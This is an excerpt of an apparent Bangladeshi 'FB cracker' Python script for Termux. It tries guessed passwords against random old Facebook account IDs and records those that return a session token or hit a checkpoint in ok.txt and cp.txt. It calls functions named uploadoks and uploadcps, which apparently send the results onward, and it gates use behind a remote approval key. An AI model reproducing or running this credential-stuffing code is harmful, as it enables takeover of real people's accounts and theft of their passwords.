...
def helpnote():
	...
	exit(" [*] FACEBOOK :  Prince Raihan M.M.M")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰Md. Saidur Rahman")
	subprocess.check_output(["am", "start", "https://m.me/VIP.BOT.CYBER.PROJECT.SK.ASLAM"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Rehat420/approval.txt/blob/main/Ap.txt').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92m")
				FY = '\033[0;93m'
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Md. Saidur Rahman 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : 🔴 Blood Donation 🔴
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : SAIDUR
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +880721458631
\033[1;90m══════════════════════════════════════════════════
    """)
		...
		print("")
		print("%s [%s01%s]%s CRACK RANDOM FB ID 2009-11 %s(Free) V1[High Speed]"%(R,G,R,Y,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SAIDUR_OLD] : %s/%s -> \033[0;92m [ SAIDUR-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SAIDUR-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SAIDUR-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SAIDUR-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SAIDUR-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
